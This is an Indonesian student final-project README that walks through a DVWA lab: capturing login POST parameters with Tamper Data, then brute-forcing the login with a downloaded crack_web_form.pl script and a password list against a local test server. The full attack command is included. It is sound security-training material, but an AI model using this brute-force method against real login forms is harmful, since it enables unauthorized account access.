# Tugas Final Project

### Anggota Kelompok

|Nama      |NRP    |
|---|---|
Rian Danis  | 5114100084
Naufan Arifie | 5114100136
Dimas Hirda P | 5114100147


### DVWA
  ### Lesson 5
  
  #### 1. Download Tamper Data
  Tamper data merupakan sebuah ekstensi yang terdapat di mozilla, download dan enable tamper data tersebut
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/Capture.PNG)
  
  #### 2. Buka Website DVWA dan Jalankan Tamper Data
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/dvwa%20start.PNG)
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/start%20tamper.PNG)
  
  #### 3. Login ke dvwa
  Saat kita login akan muncul box dari tamper data, hilangkan centang di kotak "continue tampering" dan klik submit
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/continue%20tampering.PNG)
  
  #### 4. Buka Tab Tamper Data
  Akan terlihat apa yang telah kita passing di kolom dengan method POST
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/Post%20data%20tamper.PNG)
  
  Hal ini diperlukan untuk mengetahui apa saja parameter yang di passing ke website dvwa saat login.
  
  #### 5. Buat folder pentest/passwords/cwf
  
  ```bash
  mkdir pentest
  cd pentest
  mkdir passwords
  cd passwords
  mkdir cwf
  cd cwf
  ```
  
  #### 6. Download crack_web_form.pl
  
  Download melalui link berikut http://www.computersecuritystudent.com/SECURITY_TOOLS/DVWA/DVWAv107/lesson5/cwf.tar.gz
  Kemudian save di folder cwf yang telah dibuat
  
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/openlink%20then%20save.PNG)
   
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/save%20to%20folder%20cwf.PNG)
  
  #### 7. Unzip dan Merubah permision crack_web_form.pl
  
  ```bash
  tar xovfz cwf.tar.gz
  chmod 700 crack_web_form.pl
  ```
  cek apakah sudah benar
  ```bash
  ./crack_web_form.pl -help
  ```
  ![alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/crack_web_pl.PNG)
  
  #### 8. Mencoba membobol password login dvwa menggunakan crack_web_form
  
  Jalankan command berikut
  ```bash
  ./crack_web_form.pl -U admin -P password.txt -http "http://192.168.1.32/dvwa/login.php" -data "username=USERNAME&password=PASSWORD&Login=Login" -M "Failed Login"
  ```
  Dalam percobaan saya, dibutuhkan 239 percobaan hingga menemukan password yang benar
  
  [alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/success.PNG)
  
  Password yang telah didapatkan, dapat dilihat melalui command
  ```bash
  grep Succesful crack_output.txt
  ```
  
  [alt text](https://github.com/dimashirda/PKSJ-1/blob/master/PKSJ/Lesson%205/melihat%20hasil.PNG)
  
 
   
   
   
  
  
  
  
  
  
  
  
  
  
  
  
